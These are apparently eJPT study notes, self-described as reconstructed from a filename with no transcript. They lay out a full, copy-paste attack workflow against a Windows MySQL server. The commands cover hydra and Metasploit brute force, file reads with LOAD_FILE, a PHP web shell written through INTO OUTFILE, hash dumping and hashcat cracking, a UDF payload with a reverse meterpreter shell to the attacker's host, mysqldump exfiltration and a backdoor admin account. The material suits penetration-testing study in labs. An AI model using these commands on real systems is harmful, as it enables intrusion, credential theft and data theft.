# 15 - Targeting MySQL Database Server (Windows)

Note: No transcript was provided. The following is a conservative, eJPT-aligned summary inferred from the filename and module context (01-WindowsExploitation). Commands and steps reflect standard, exam-relevant MySQL attack workflows on Windows targets.

## What the video covers (Introduction / big picture)
- Discovering and enumerating a MySQL service (default TCP 3306) on a Windows host.
- Testing for default/weak credentials and programmatic brute force.
- Authenticating and enumerating MySQL users, databases, and privileges.
- Reading and writing files on a Windows system via MySQL (FILE privilege and secure_file_priv).
- Dumping MySQL password hashes and cracking them offline.
- Using Metasploit for MySQL login, enumeration, and (if permitted) UDF-based code execution on Windows.
- Practical tips when paths, privileges, or security variables restrict file operations.

## Flow (ordered)
1. Identify port 3306 and fingerprint MySQL version.
2. Run NSE enumeration scripts for quick checks (empty password, variables).
3. Try common/default credentials, then brute force if allowed.
4. Log in with mysql client; enumerate server variables, user/privileges, and databases.
5. Check file privileges (secure_file_priv, FILE privilege); read a known Windows file (win.ini).
6. If possible, write a web shell into a known webroot; otherwise enumerate allowed OUTFILE directory.
7. Dump MySQL user hashes; crack offline.
8. Optional Metasploit modules: mysql_login, mysql_enum, mysql_hashdump; UDF payload on Windows for OS shell if permitted.
9. Exfiltrate data with mysqldump; consider persistence (new DB user).
10. Cleanup artifacts.

## Tools highlighted
- nmap + NSE scripts: mysql-info, mysql-variables, mysql-empty-password, mysql-users, mysql-query
- mysql client (MariaDB client on Kali still uses mysql)
- hydra or Metasploit auxiliary/scanner/mysql/mysql_login
- Metasploit: mysql_login, mysql_enum, mysql_hashdump, mysql_schemadump, exploit/windows/mysql/mysql_udf_payload
- hashcat (MySQL 4.1+/5.x hashes, mode 300)
- mysqldump

## Typical command walkthrough (detailed, copy-paste friendly)

Replace placeholders:
- TARGET with the target IP or hostname
- USER/PASS with discovered credentials
- KALI_IP with your attacking host
- WORDLIST with your password list file

Discovery and versioning:
```bash
# Quick port and service/version detection
nmap -sV -sC -p3306 TARGET

# Focused MySQL NSE checks (unauthenticated)
nmap -p3306 --script mysql-info,mysql-variables,mysql-empty-password TARGET
```

Password attacks:
```bash
# Fast checks for common defaults
mysql -h TARGET -P 3306 -u root      # Press Enter if prompted for a password (tests empty)
mysql -h TARGET -P 3306 -u root -p   # Try common passwords manually if allowed

# Hydra brute force (service name: mysql)
hydra -l root -P /usr/share/wordlists/rockyou.txt -s 3306 -f -o hydra_mysql.txt -t 4 TARGET mysql
```

Metasploit (alternative to hydra + scripted enumeration):
```bash
msfconsole -q
use auxiliary/scanner/mysql/mysql_login
set RHOSTS TARGET
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set BLANK_PASSWORDS true
set STOP_ON_SUCCESS true
run

# Set credentials globally once found
setg RHOSTS TARGET
setg USERNAME root
setg PASSWORD Passw0rd!
use auxiliary/admin/mysql/mysql_enum
run
use auxiliary/scanner/mysql/mysql_hashdump
run
```

Manual login and enumeration:
```bash
# Login (TCP)
mysql -h TARGET -P 3306 -u USER -p

# Inside MySQL shell:
SHOW VARIABLES LIKE '%version%';
SELECT VERSION(), @@version_comment;
SELECT USER(), CURRENT_USER();
SHOW GRANTS FOR CURRENT_USER();

-- Core recon
SHOW DATABASES;
USE information_schema;
SHOW TABLES;
SELECT schema_name FROM information_schema.schemata;

-- Server paths/privileges relevant to file I/O
SHOW VARIABLES LIKE 'secure_file_priv';
SHOW VARIABLES LIKE 'plugin_dir';
SHOW VARIABLES LIKE 'datadir';
SHOW VARIABLES LIKE 'local_infile';
```

File read (Windows: safe test files):
```sql
-- Requires FILE privilege, secure_file_priv permitting reads
SELECT LOAD_FILE('C:/Windows/win.ini');
SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts');

-- If secure_file_priv points to a specific directory, only paths under it will succeed.
```

File write (possible web shell on Windows if webroot is known and FILE privilege allows it):
```sql
-- PHP web shell example (typical XAMPP path). Adjust path to actual webroot.
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php';

-- If you hit: "The MySQL server is running with the --secure-file-priv option"
-- First find the allowed directory:
SHOW VARIABLES LIKE 'secure_file_priv';
-- Then write there and manually retrieve/abuse as appropriate.
```

Dump users and hashes:
```sql
-- MySQL 5.7+ (authentication_string present)
SELECT host, user, plugin, authentication_string FROM mysql.user;

-- Older versions (password column)
SELECT host, user, password FROM mysql.user;
```

Crack hashes with hashcat (MySQL 4.1+/5.x):
```bash
# Save hashes (just the hex hash) to mysql_hashes.txt, one per line.
# Hashcat mode 300: MySQL4.1/MySQL5 (double SHA1)
hashcat -m 300 -a 0 mysql_hashes.txt /usr/share/wordlists/rockyou.txt --username
```

Query via Nmap with credentials (useful for quick scripted checks):
```bash
# List users with NSE when creds are known
nmap -p3306 --script mysql-users --script-args mysqluser=USER,mysqlpass=PASS TARGET

# Run a query via NSE:
nmap -p3306 --script mysql-query --script-args 'query=SHOW DATABASES;,mysqluser=USER,mysqlpass=PASS' TARGET
```

Exfiltrate data:
```bash
# Database list
mysql -h TARGET -P 3306 -u USER -p -e "SHOW DATABASES;"

# Dump all databases (no locking, if permitted)
mysqldump -h TARGET -P 3306 -u USER -p --all-databases --single-transaction > all_dbs.sql
```

Optional: Windows code execution via UDF (Metasploit; requires high privileges):
```bash
# Use with caution; exam/lab rules may restrict this.
msfconsole -q
use exploit/windows/mysql/mysql_udf_payload
set RHOSTS TARGET
set LHOST KALI_IP
set PAYLOAD windows/meterpreter/reverse_tcp
set USERNAME USER
set PASSWORD PASS
run
```

Persistence (DB-level, if allowed):
```sql
-- Create a remote-access admin user (e.g., for follow-up testing)
CREATE USER 'audit'@'%' IDENTIFIED BY 'Str0ngP@ss!';
GRANT ALL PRIVILEGES ON *.* TO 'audit'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

Cleanup (good practice):
```sql
-- Remove test shells/users you created
DROP USER 'audit'@'%';
-- If you wrote a file:
-- DELETE or remove it at the OS level (outside the DB) after engagement concludes.
```

## Practical tips
- MySQL on Windows often ships in stacks (XAMPP, WAMP). Default root with empty password is common in older/lab setups; test it first.
- Use Windows-style paths with forward slashes or escaped backslashes: C:/Windows/win.ini or C:\\Windows\\win.ini.
- secure_file_priv controls where LOAD_FILE/OUTFILE operate. If set to a directory, you can only read/write there.
- Test read access safely with C:/Windows/win.ini before attempting sensitive files.
- For web shells, you must know the active webroot and stack (IIS vs Apache; PHP installed?). Typical paths:
  - XAMPP: C:/xampp/htdocs/
  - IIS default: C:/inetpub/wwwroot/ (ASP/ASPX, not PHP unless configured)
- MySQL 8+ often uses caching_sha2_password; old hash-cracking approaches may not apply.
- Respect account lockout policies; throttle brute force (Hydra -t) and consider time-based delays.
- When using mysqldump, add --single-transaction to reduce locking on InnoDB.

## Minimal cheat sheet (one-screen flow)
```bash
# 1) Discover
nmap -sV -sC -p3306 TARGET
nmap -p3306 --script mysql-info,mysql-variables,mysql-empty-password TARGET

# 2) Try creds
mysql -h TARGET -P 3306 -u root
mysql -h TARGET -P 3306 -u root -p

# 3) Brute (if allowed)
hydra -l root -P /usr/share/wordlists/rockyou.txt -s 3306 -f -o hydra_mysql.txt -t 4 TARGET mysql

# 4) Login and enum
mysql -h TARGET -P 3306 -u USER -p -e "SELECT VERSION(); SHOW DATABASES; SHOW VARIABLES LIKE 'secure_file_priv'; SHOW GRANTS FOR CURRENT_USER();"

# 5) File read (Windows)
mysql -h TARGET -P 3306 -u USER -p -e "SELECT LOAD_FILE('C:/Windows/win.ini');"

# 6) Dump users/hashes
mysql -h TARGET -P 3306 -u USER -p -e "SELECT host,user,plugin,authentication_string FROM mysql.user;"

# 7) Crack (MySQL 4.1+/5.x)
hashcat -m 300 -a 0 mysql_hashes.txt /usr/share/wordlists/rockyou.txt --username

# 8) Data exfil
mysqldump -h TARGET -P 3306 -u USER -p --all-databases --single-transaction > all_dbs.sql
```

## Summary
- The target is a Windows-hosted MySQL service on TCP 3306.
- Start with discovery and NSE checks, then test default credentials and (if permitted) brute force.
- After authentication, enumerate variables, privileges, and databases, and assess file I/O capability via secure_file_priv/FILE privilege.
- Safely confirm file read via LOAD_FILE; if possible, use OUTFILE for a web shell in a known webroot.
- Extract and crack user hashes for further access; exfiltrate data with mysqldump.
- Metasploit provides streamlined login/enumeration and, on Windows with high privileges, UDF-based OS code execution.